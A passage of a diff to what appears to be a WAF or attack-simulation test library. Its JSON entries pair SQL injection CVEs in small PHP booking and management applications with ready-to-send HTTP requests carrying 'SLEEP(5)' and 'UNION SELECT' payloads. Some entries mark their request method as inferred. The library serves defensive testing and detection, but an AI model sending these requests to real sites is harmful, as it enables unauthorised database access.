+    "description": "itsourcecode Insurance Management System 1.0 is vulnerable to SQL injection in the client_id parameter of /insurance/editClient.php. The request sends a time-based payload (1' AND SLEEP(5)-- -) in client_id. Method is GET (a record-view/edit id parameter). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/itsourcecode.com/insurance-management-system/SQLi-2.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29999 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /insurance/editClient.php?client_id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29999"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29999",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/itsourcecode.com/insurance-management-system/SQLi-2.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-29999",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-29999"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29998 - itsourcecode Insurance Management System SQL Injection",
+    "displayName": "CVE-2022-29998 - itsourcecode Insurance Management System SQL Injection",
+    "description": "itsourcecode Insurance Management System 1.0 is vulnerable to SQL injection in the client_id parameter of /insurance/clientStatus.php. The request sends a time-based payload (1' AND SLEEP(5)-- -) in client_id. Method is GET (a record id parameter). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/itsourcecode.com/insurance-management-system/SQLi-1.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29998 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /insurance/clientStatus.php?client_id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29998"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29998",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/itsourcecode.com/insurance-management-system/SQLi-1.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-29998",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-29998"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29995 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "displayName": "CVE-2022-29995 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "description": "oretnom23 Online Sports Complex Booking System 1.0 is vulnerable to SQL injection in the id parameter of the clients/manage_client page (/scbs/admin/?page=clients/manage_client). The request sends a time-based payload (1' AND SLEEP(5)-- -) in id. Method is GET (a record id parameter). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-9.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29995 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /scbs/admin/?page=clients/manage_client&id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29995"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29995",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-9.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-29995",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-29995"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29994 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "displayName": "CVE-2022-29994 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "description": "oretnom23 Online Sports Complex Booking System 1.0 is vulnerable to SQL injection in the id parameter of the facilities/manage_facility page (/scbs/admin/?page=facilities/manage_facility). The request sends a time-based payload (1' AND SLEEP(5)-- -) in id. Method is GET (a record id parameter). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-10.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29994 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /scbs/admin/?page=facilities/manage_facility&id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29994"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29994",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-10.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-29994",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-29994"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29993 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "displayName": "CVE-2022-29993 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "description": "oretnom23 Online Sports Complex Booking System 1.0 is vulnerable to SQL injection in the id parameter of /scbs/admin/bookings/view_booking.php. The request sends a time-based payload (1' AND SLEEP(5)-- -) in id. Method is GET (a record-view id parameter). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-8.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29993 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /scbs/admin/bookings/view_booking.php?id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29993"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29993",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-8.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-29993",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-29993"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29992 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "displayName": "CVE-2022-29992 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "description": "oretnom23 Online Sports Complex Booking System 1.0 is vulnerable to SQL injection in the id parameter of /scbs/admin/categories/manage_category.php. The request sends a time-based payload (1' AND SLEEP(5)-- -) in id. Method is GET (a record id parameter). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQli-7.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29992 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /scbs/admin/categories/manage_category.php?id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29992"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29992",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQli-7.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-29992",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-29992"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29990 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "displayName": "CVE-2022-29990 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "description": "oretnom23 Online Sports Complex Booking System 1.0 is vulnerable to SQL injection in the id parameter of /scbs/admin/categories/view_category.php. The request sends a time-based payload (1' AND SLEEP(5)-- -) in id. Method is GET (a record-view id parameter). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-6.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29990 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /scbs/admin/categories/view_category.php?id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29990"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29990",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-6.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-29990",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-29990"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29989 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "displayName": "CVE-2022-29989 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "description": "oretnom23 Online Sports Complex Booking System 1.0 is vulnerable to SQL injection in the id parameter handled by the delete_booking action of /scbs/classes/Master.php (Master.php?f=delete_booking). The request sends a time-based payload (1' AND SLEEP(5)-- -) in id. INFERRED: the Master.php AJAX handler uses extract($_POST), so method is POST and the injectable argument is the id form field; flagged as inferred. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-3.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29989 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /scbs/classes/Master.php?f=delete_booking HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nid=1%27%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2022-29989"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29989",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-3.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-29989",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-29989"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29988 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "displayName": "CVE-2022-29988 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "description": "oretnom23 Online Sports Complex Booking System 1.0 is vulnerable to SQL injection in the id parameter handled by the delete action of /scbs/classes/Master.php (Master.php?f=delete). The request sends a time-based payload (1' AND SLEEP(5)-- -) in id. INFERRED: the Master.php AJAX handler uses extract($_POST), so method is POST and the injectable argument is the id form field; flagged as inferred. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-4.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29988 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /scbs/classes/Master.php?f=delete HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nid=1%27%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2022-29988"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29988",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-4.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-29988",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-29988"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29987 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "displayName": "CVE-2022-29987 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "description": "oretnom23 Online Sports Complex Booking System 1.0 is vulnerable to SQL injection in the id parameter of the user/manage_user page (/scbs/admin/?page=user/manage_user). The request sends a time-based payload (1' AND SLEEP(5)-- -) in id. Method is GET (a record id parameter). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-5.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29987 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /scbs/admin/?page=user/manage_user&id=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29987"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29987",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-5.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-29987",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-29987"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29986 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "displayName": "CVE-2022-29986 - oretnom23 Online Sports Complex Booking System SQL Injection",
+    "description": "oretnom23 Online Sports Complex Booking System 1.0 is vulnerable to SQL injection in the id parameter handled by the delete_facility action of /scbs/classes/Master.php (Master.php?f=delete_facility). The request sends a time-based payload (1' AND SLEEP(5)-- -) in id. INFERRED: the Master.php AJAX handler uses extract($_POST), so method is POST and the injectable argument is the id form field; flagged as inferred. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-2.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29986 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /scbs/classes/Master.php?f=delete_facility HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nid=1%27%20AND%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2022-29986"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29986",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-2.md"
+      },
+      {
+        "title": "CVE record for CVE-2022-29986",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2022-29986"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29985 - SourceCodester Online Sports Complex Booking System SQL Injection",
+    "displayName": "CVE-2022-29985 - SourceCodester Online Sports Complex Booking System SQL Injection",
+    "description": "SourceCodester (oretnom23) Online Sports Complex Booking System 1.0 is vulnerable to SQL injection in the id argument handled by the delete_category function of classes/Master.php (Master.php?f=delete_category). The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the PoC. HTTP method (GET) inferred for the delete action and flagged.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-1.md (PoC)\n- https://packetstormsecurity.com/files/166598/oscbs10id-sql.txt (PoC mirror, id parameter)\n- https://www.cve.org/CVERecord?id=CVE-2022-29985 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /scbs/classes/Master.php?f=delete_category&id=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29985"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29985",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/Online-Sports-Complex-Booking-System/SQLi-1.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29984 - SourceCodester Simple Client Management System SQL Injection",
+    "displayName": "CVE-2022-29984 - SourceCodester Simple Client Management System SQL Injection",
+    "description": "SourceCodester Simple Client Management System 1.0 is vulnerable to SQL injection in the id parameter of the client/view_client page (admin/?page=client/view_client&id=). The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-11.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29984 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /cms/admin/?page=client/view_client&id=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29984"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29984",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-11.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29983 - SourceCodester Simple Client Management System SQL Injection",
+    "displayName": "CVE-2022-29983 - SourceCodester Simple Client Management System SQL Injection",
+    "description": "SourceCodester Simple Client Management System 1.0 is vulnerable to SQL injection in the id parameter of the invoice/view_invoice page (admin/?page=invoice/view_invoice&id=). The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-10.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29983 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /cms/admin/?page=invoice/view_invoice&id=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29983"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29983",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-10.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29982 - SourceCodester Simple Client Management System SQL Injection",
+    "displayName": "CVE-2022-29982 - SourceCodester Simple Client Management System SQL Injection",
+    "description": "SourceCodester Simple Client Management System 1.0 is vulnerable to SQL injection in the id parameter of admin/maintenance/manage_service.php. The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-9.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29982 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /cms/admin/maintenance/manage_service.php?id=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29982"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29982",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-9.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29981 - SourceCodester Simple Client Management System SQL Injection",
+    "displayName": "CVE-2022-29981 - SourceCodester Simple Client Management System SQL Injection",
+    "description": "SourceCodester Simple Client Management System 1.0 is vulnerable to SQL injection in the id argument handled by the delete function of classes/Users.php (Users.php?f=delete). The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the PoC. HTTP method (GET) inferred for the delete action and flagged.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-8.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29981 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /cms/classes/Users.php?f=delete&id=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29981"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29981",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-8.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29980 - SourceCodester Simple Client Management System SQL Injection",
+    "displayName": "CVE-2022-29980 - SourceCodester Simple Client Management System SQL Injection",
+    "description": "SourceCodester Simple Client Management System 1.0 is vulnerable to SQL injection in the id parameter of the user/manage_user page (admin/?page=user/manage_user&id=). The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-7.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29980 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /cms/admin/?page=user/manage_user&id=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29980"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2022-29980",
+        "link": "https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-7.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2022-29979 - SourceCodester Simple Client Management System SQL Injection",
+    "displayName": "CVE-2022-29979 - SourceCodester Simple Client Management System SQL Injection",
+    "description": "SourceCodester Simple Client Management System 1.0 is vulnerable to SQL injection in the id argument handled by the delete_designation function of classes/Master.php (Master.php?f=delete_designation). The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the PoC. HTTP method (GET) inferred for the delete action and flagged.\n\nReferences used to recreate this request:\n- https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/simple-client-management-system/SQLi-6.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2022-29979 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /cms/classes/Master.php?f=delete_designation&id=-1%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2022-29979"
+    ],
+    "cwes": [
